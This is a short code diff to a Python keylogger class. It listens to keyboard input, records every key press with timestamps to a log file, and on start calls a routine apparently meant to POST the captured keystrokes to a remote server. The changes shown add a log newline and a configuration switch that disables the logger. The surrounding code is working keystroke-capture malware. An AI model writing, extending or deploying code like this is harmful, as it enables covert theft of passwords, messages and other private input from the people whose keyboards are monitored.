@@ -42,7 +42,7 @@ class Keylogger:
         try:
             with open(self.log_path, "a", encoding="utf-8") as archivo:
                 if self.text == "":
-                    archivo.write(f"[{datetime.datetime.now().isoformat(timespec='seconds')}] --- IGNORE ---\n")
+                    archivo.write(f"\n[{datetime.datetime.now().isoformat(timespec='seconds')}] --- IGNORE ---\n")
 
                 archivo.write(self.text)
                 self.text = ""
@@ -81,6 +81,10 @@ class Keylogger:
                 self.text += f"[{str(key).replace('Key.', '')}]"
 
     def start(self):
+        if not self._bool("enabled"):
+            print("[INFO] Keylogger is disabled in the configuration.")
+            return
+        
         with keyboard.Listener(on_press=self.on_press) as listener:
             self.send_post_req()
             self.listener = listener
